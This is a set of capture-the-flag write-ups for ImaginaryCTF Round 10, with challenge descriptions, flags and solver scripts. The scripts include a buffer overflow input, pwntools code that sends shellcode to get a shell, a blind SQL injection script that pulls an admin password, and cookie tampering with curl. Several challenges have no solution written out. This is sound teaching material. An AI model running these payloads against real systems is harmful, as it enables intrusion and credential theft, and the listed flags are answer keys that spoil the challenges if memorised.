# Sanity Check Round 10

> Points: 15 | Category: Misc | Author: Board

Welcome to Round 10! DM flags to me to get points, and rise up on the leaderboard! Have fun and enjoy Round 10!

https://forms.gle/Yyb19PmAxJjyiuCP9

---

Fill out the google form and it will give you the flag

`ictf{S@nity_Check_R0und_10}`

---

# &aaa

> Points: 30 | Category: Pwn | Author: Eth007

Pwn my server. Connect with `nc oreos.ctfchallenge.ga 7331`

https://imaginary.ml/r/3727-aaa

---

Opening the executable in ghidra, we can see the main function

```c
undefined8 main(void)

{
  char local_28 [28];
  int local_c;

  local_c = 0;
  setvbuf((FILE *)stdout,(char *)0x0,2,0);
  setvbuf((FILE *)stdin,(char *)0x0,2,0);
  puts("Enter username and password, separated by spaces:");
  gets(local_28);
  if (local_c != 0) {
    system("cat flag.txt");
  }
  return 0;
}
```

All we have to do is overwrite the `local_c` variable by putting at least 29 characters into the input field.

```sh
$ nc oreos.ctfchallenge.ga 7331

Enter username and password, separated by spaces:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
ictf{buff3r_0verfl0w_1s_d4ng3r0us}
```

`ictf{buff3r_0verfl0w_1s_d4ng3r0us}`

---

# Waiting game...

> Points: 30 | Category: Web | Author: Max49

Life's a waiting game... sometimes you have to wait for a while to get ahead

https://waiting-game.max49.repl.co/

---

While looking through the source code, this line caught my attention

```html
<meta http-equiv="refresh" content="100000000000000; url = /0x666c6167.html" />
```

It's saying is that the page will reload and redirect us to the `/0x666c6167.html` route after 100000000000000 seconds

We can get the flag by just going to the page directly

https://waiting-game.max49.repl.co/0x666c6167.html

`ictf{a_r3a11y_n1ce_wa1t1ng_gam3}`

---

# Countdown Baseball

> Points: 75 | Category: Crypto | Author: FIREPONY57

Waiting for the 10 seconds its going to take people to solve this

https://imaginary.ml/r/A1F0-countdown-baseball.txt

---

```py
import math
with open("countdown-baseball.txt") as f:
    a = f.read()

def f(s, b):
    try:
        print("\n\n{}\n\n".format(b+1))
        numDigits = math.ceil(math.log(256, b))
        tmp = [s[i:i+numDigits] for i in range(0, len(s), numDigits)]
        newBaseStr = "".join([ chr(int(i, b)) for i in tmp ])
        print(newBaseStr)
        return f(newBaseStr, b+1)
    except Exception as e:
        print("ERROR")
        print(e)
        return 0

f(a, 2)
```

```py
ans = "105991161021239864115511159510364494811451125"

asciiVal = ""
for i in ans:
    asciiVal += str(i)
    if 32 <= int(asciiVal) <= 127:
        print(chr(int(asciiVal)), end="")
        asciiVal = "0"
```

`ictf{b@s3s_g@10r3}`

---

# neat-rsa

> Points: 65 | Category: Crypto | author: ainz

RSA is pretty neat, especially when a source is provided.

- https://imaginary.ml/r/C2F4-main.py

- https://imaginary.ml/r/A9AA-rsa.txt

---

We are given everything that's usually given in an RSA problem (N, e, ct), plus some extra information:

1. `N2 = q*r` where `r` is a randomly generated prime number

2. `N2 + N*elusive` where `elusive` is a randomly generated number

N and N2 are both products of 2 prime numbers. We don't know what these prime numbers are, but we do know that N and N2 share `q` as a common factor. This means that `gcd(N, N2) = q`

The `gcd(N, N2+N*elusive)` is equivalent to `gcd(N, N2)` because of a property of GCD which states: `if m is any integer, then gcd(a + m⋅b, b) = gcd(a, b)`.

Because of this property, we can easily get `q`, and in turn, the flag.

```py
from math import gcd
from Crypto.Util.number import long_to_bytes

n1 = 129851722357947445345870990963660632711447373178135819868899984182659557798630904818907679897656671090445195493024305192175998357725180728308641342052877827178063748226956003293995628809809946890377677500727765422671309139577956460806060356061643066260620532143971581138444887013251083401740953016800526561369
e = 65537
n2n1elusive = 354020441161271454238824233113483251424739165273603253089281992413904299790750998993004221545361940017125675049620866260946107295019570616958455252820784279420662013197185267268535478305987123286908618637917837561207744990593948143827775524857529903243255631176220324605682439947302448209103973570727852816857845902079
ct = 99860436465836391865653329628063911057946675204553849493647896562280037248239340521968032740474787220879813274343214941793443913638426853461368251451691055571860562982592326807064465612371566427699272833229440737810391158841432366489390151103656479013891591734401496841642436054950303923680083243969093719406

q = gcd(n1, n2n1elusive)
p = n1//q
d = pow(e, -1, (p-1)*(q-1))
print(long_to_bytes(pow(ct, d, n1)))
```

`ictf{why_c@nt_1_ev3r_c0m3_up_with_c0ol3r_flag5_:rooNobooli:}`

---

# Horst

> Points: 75 | Category: reversing, crypto | Author: Robin_Jadoul

I found this interesting cipher structure. Could you check if it's secure?

- https://imaginary.ml/r/5188-horst.py

- https://imaginary.ml/r/A0D2-output.txt

---

```py
#!/usr/bin/env python3
import hashlib

def xor(a, b):
    assert len(a) == len(b)
    return bytes(x^y for x,y in zip(a,b))

def getPreviousRound(s):
    prevRight = s[:32]
    prevLeft = xor(s[32:], hashlib.sha256(prevRight).digest())
    return prevLeft + prevRight

def decrypt(s):
    for i in range(25):
        s = getPreviousRound(s)
    return s

ct = bytes.fromhex("b020563166cfacda8201e8817265baf945b2dc49517f73903241f9fbedd3943d79d17b6ecd6acb45810eb95b1687ead8851fc923fdb40d5e208f3d4a34840bd1")

print(decrypt(ct))
```

`ictf{imagine_not_using_a_key_for_your_feistel_cipher_67e63cc381}`

---

# Green Shell

> Points: 50 | Category: pwn | Author: Robin_Jadoul

The Green Shell is a launchable, which when launched from a player, will start moving. The shell takes 5 bounces on walls before it will break. This can be deadly to players ahead as they must dodge it. It is referred to players as the "worst" shell, mainly because it roams freely instead of targeting a player. The shell is green with black lines. Connect with `nc oreos.imaginary.ml 12345`.

https://imaginary.ml/r/39AF-dist.zip

---

The server runs anything we send to it, so we can spawn a reverse shell by sending some machine code. `pwntools` makes this really easy.

```py
#!/usr/bin/env python3
from pwn import *
context.binary = ELF('./green_shell')
p = remote("oreos.imaginary.ml", 12345)

payload = asm(shellcraft.sh())
p.sendline(payload)
p.interactive()
```

`ictf{it's-a_me_sh3llc0d10}`

---

# Wordbook

> Points: 50 | Category: Misc | Author: FIREPONY57

"I'm going to learn some new words..." \*opens book

`nc imaginary.ml 10069`

---

In order to solve this challenge, we need to map each encrypted value to it's plaintext value. The program allows us to encrypt whatever we want, so we can pass through all the printable characters and store both the plaintext and encrypted text as a key-value pair inside of a dictionary. From here, we just need to get each encrypted character's corresponding plaintext from the dictionary and save it to a string.

```py
from pwn import *
import string

chars = string.printable
r = remote("imaginary.ml", 10069)

encryptedFlag = r.recvS().split("\n")[1]
r.sendline(chars.encode())
obj = dict(zip(r.recvS().split("\n")[1], chars))

[ print(obj[i], end="") for i in encryptedFlag ]
```

`ictf{d1ct10n@ri3s_m@k3_y0u_sm@r73r}`

---

# Introductory ICICLE

> Points: 100 | Category: Programming/Reversing | Author: puzzler7

Introducing ICICLE (Imaginary Ctf Instruction Collection for Learning assEmbly)! It's a programming challenge, so I didn't want to use an existing language and give some people an unfair advantage, so I made my own! See the spec and implement an interpreter to run the provided file, and get the flag.

https://imaginary.ml/r/8DFE-chall1.s, https://imaginary.ml/r/1560-spec_v1.md

---

```py
with open("output.txt") as f:
    lines = f.readlines()
    lines = [ i.replace(",", "").replace('"', "").split(" ") for i in [line.rstrip() for line in lines if line.strip()] ]

obj = {}

def mult(a, b, c):
    obj[a] = obj[b] * int(c)

def mod(a, b, c):
    obj[a] = int(obj[b]) % int(c)

def pr(a):
    print(obj[a])

def intstr(a ,b):
    # converts an int into a string
    b = hex(int(obj[b]))[2:]
    obj[a] = "".join([ chr(int(b[i:i+2], 16)) for i in range(0, len(b), 2) ])

def xor(a, b, c):
    b, c = obj[b], obj[c]
    if isinstance(b, int) and isinstance(c, int):
        # they are both ints
        obj[a] = b ^ c
        return 0
    if isinstance(b, int):
        intstr(b, b)
    elif isinstance(c, int):
        intstr(c, c)

    longestString = max(b, c, key=len)
    shorterString = min(b, c, key=len)
    res = ""
    for i in range(len(longestString)):
        res += chr(ord(longestString[i]) ^ ord(shorterString[i%len(shorterString)]))
    obj[a] = res

def rev(a, b):
    isInt = isinstance(obj[b], int)
    b = str(obj[b])[::-1]
    obj[a] = int(b) if isInt else b

def mov(a, b):
    obj[a] = b


def execute(funcName, a, b=None, c=None):
    if funcName == "xor":
        xor(a, b, c)
    elif funcName == "rev":
        rev(a, b)
    elif funcName == "mov":
        mov(a, b)
    elif funcName == "intstr":
        intstr(a, b)
    elif funcName == "mod":
        mod(a, b, c)
    elif funcName == "mult":
        mult(a, b, c)
    elif funcName == "pr":
        pr(a)

[ execute(*cmd) for cmd in lines ]
```

`ictf{th3_w@rm3st_ICICLE_y0u've_s33n}`

---

# &bbb

> Points: 85 | Category: Pwn | Author: Eth007

You overflowed my buffer, now get a shell. The flag is located in `another_flag.txt`. Connect with `nc oreos.ctfchallenge.ga 7331`. Good luck! (The binary and connection are the same as the previous challenge, called "&aaa")

https://imaginary.ml/r/3727-aaa

---

---

# Imaginary Shop

> Points: 82 | Category: Web | Author: Max49

I just opened my own Imaginary Shop! Come check it out and see what we have to offer. I'm confident it's perfect in every way.

https://imaginary-shop.max49.repl.co/

---

To get the flag, we need to cause an error code 500 on the website. To do this, we will include a valid item to buy, but leave out the money parameter. This will cause the desired error, but we're not done yet because we also need to set 3 cookies (`item`, `money`, `add`) on the webpage. The `item` cookie has to be equal to the `money` cookie, and the `add` cookie needs to be set to 1. We can do all this in a curl command.

```sh
curl -b "item=1;money=1;add=1" https://imaginary-shop.max49.repl.co/shop?buy=water
```

`ictf{1nt3nt10nal_f1ask_pyth0n_3rr0rs?}`

---

# ROPnCall

> Points: 75 | Category: pwn | Author: ainz

`get()` is dangerous, canary is disabled, ROP is cool, what else?

https://imaginary.ml/r/FCDE-ROPnCall

---

---

# Two Loves

> Points: 75 | Category: Steganography | Author: StealthyDev

The Bard, too, saw hidden messages

https://imaginary.ml/r/38C8-TwoLoves.txt

---

---

# Broken Bear

> Points: 50 | Category: Forensics | Author: cleverbear57

My bear is broken. Can you fix it? (If you have nitro, please submit your flag through the website.)

https://imaginary.ml/r/B8C2-broken_bear.png

---

---

# neatX2-rsa

> Points: 80 | Category: Crypto | Author: ainz

Slash the flag into two and you get even neater RSA.

- https://imaginary.ml/r/3711-main.py

- https://imaginary.ml/r/435D-rsa.txt

---

`ictf{rsa_c@n_be_scary_but_th3_0nly_th1ng_th3y_f3@r_15_y0u_3qu1pped_w1th_th3_Z3_5MT_50lv3r}`

---

# An ICICLE to Remember

> Points: 100 | Category: Programming/Reversing | Author: puzzler7

The last interpreter was just simple arithmetic, but we all know that a language isn't interesting if you can't loop! Add in some control flow, and while you're at it, add in some memory, too. Check the updated spec, changes are bolded or marked with (new!). Once again, run the file to get the flag.

https://imaginary.ml/r/60C8-spec_v2.md, https://imaginary.ml/r/E0E3-chall2.s

---

---

# Boxed in

> Points: 100 | Category: misc | Author: Robin_Jadoul

Box outside the think

https://imaginary.ml/r/BE85-boxed_in.c

`nc oreos.imaginary.ml 30000`

---

---

# syscall me maybe

> Points: 50 | Category: pwn | Author: Robin_Jadoul

I threw a binary in the well

Don't ask me, I'll never tell

I looked to you as it fell

And now you're in my way

https://imaginary.ml/r/616B-syscall_me_maybe

`nc oreos.imaginary.ml `

---

---

# Guess the Password

> Points: 75 | Category: misc | Author: puzzler7

Who doesn't love a guessing challenge? Maybe you can _channel_ your attention _inside_ the code to figure it out.

`nc oreos.imaginary.ml 3000`, https://imaginary.ml/r/E0FF-password.py

---

```py
from pwn import *
import time
import math

r = remote("oreos.imaginary.ml", 3000)
r.recv()
r.sendline(b"2")
r.recv()

ans = ""
for i in range(8):
    r.sendline(b"z")
    startTime = time.time()
    r.recv()
    endTime = time.time()
    ans += str(hex(math.floor((endTime - startTime)/0.3 - 1))[2:])
    print(ans)

for i in range(8):
    r.sendline(ans[i].encode())
    print(r.recv())
```

It's worth noting that this code does not work all the time. It's most likely because the startTime and endTime are sometimes off by just enough to throw off a character (like an 8 becomes a 9). The script still gets the job done, and after running it a few times, I got the flag.

`ictf{t!m!ng_!5_3v3ry+h!ng}`

---

# Ask Hell

> Points: 135 | Category: Reversing | Author: A~Z

My friend speaks the language of gods, but when I told him I didn't like it he stole my flag! Please help me retrieve it ><

https://imaginary.ml/r/131E-main.hs

---

---

# IRC drama

> Points: 50 | Category: Misc | Author: Robin_Jadoul

So freenode is dead you say?
Just find me on `##imaginaryctf` on Libera in that case.

It's dangerous out there, take this. CTF player obtained `gimmeflagpls`

---

---

# Suspicious Server

> Points: 100 | Category: Crypto | Author: The Crafters

This server is pretty sus

https://imaginary.ml/r/57B0-player.txt, `nc oreos.imaginary.ml 7777`

---

---

# Super Quantum League

> Points: 97 | Category: Web | Author: Eth007

The `admin` user looks interesting

The flag is the password of the `admin` user

- http://superquantumleague.imaginary.ml/
- https://imaginary.ml/r/A72B-superquantumleague.py

---

This is a blind SQL injection challenge.

```py
import requests
from string import printable

flag = "ictf{"
url = "https://superquantumleague.imaginary.ml/user?username="

while flag[-1] != "}":
    for c in printable:
        query = f"admin' AND password LIKE \'%{flag}\{c}%\' ESCAPE '\\';--"
        r = requests.get(url + query)
        if r.text == 'Welcome, admin. You logged in. The flag is not ictf{fake_flag}.':
            flag += c
            print(flag)
            break
```

`ictf{bl1nd_1nj3ct1on_ftw_5a7566bc}`

---
